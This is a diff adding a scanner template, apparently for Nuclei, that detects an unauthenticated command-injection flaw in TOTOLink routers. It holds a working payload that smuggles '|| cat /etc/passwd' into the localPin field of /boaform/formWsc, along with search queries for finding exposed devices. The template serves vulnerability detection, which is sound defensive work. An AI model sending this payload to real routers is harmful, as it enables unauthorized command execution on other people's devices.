@@ -1,0 +1,54 @@
+flow: http(1) && http(2)
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - status_code==200
+    - contains(tolower(body), "totolink")
+    internal: true
+    type: dsl
+  raw:
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+- matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /boaform/formWsc HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20cat%20/etc/passwd
+
+    '
+id: totolink-boaform-rce
+info:
+  author: ritikchaddha
+  classification:
+    cwe-id: CWE-78
+  description: 'TOTOLink routers are vulnerable to unauthenticated remote command
+    execution via the /boaform/formWsc endpoint. An attacker can inject OS commands
+    through the localPin parameter.
+
+    '
+  metadata:
+    fofa-query: title="TOTOLINK"
+    max-request: 2
+    product: TOTOLINK
+    runzero-match: any(each(service["html.titles"]), {# matches "(?i)TOTOLINK"})
+  name: TOTOLink Router - Remote Command Execution
+  reference:
+  - https://github.com/fizz-is-on-the-way/Iot_vuls/blob/main/N150RT/RCE_formWsc/README.md
+  severity: critical
+  tags: totolink,rce,router,boaform,vuln
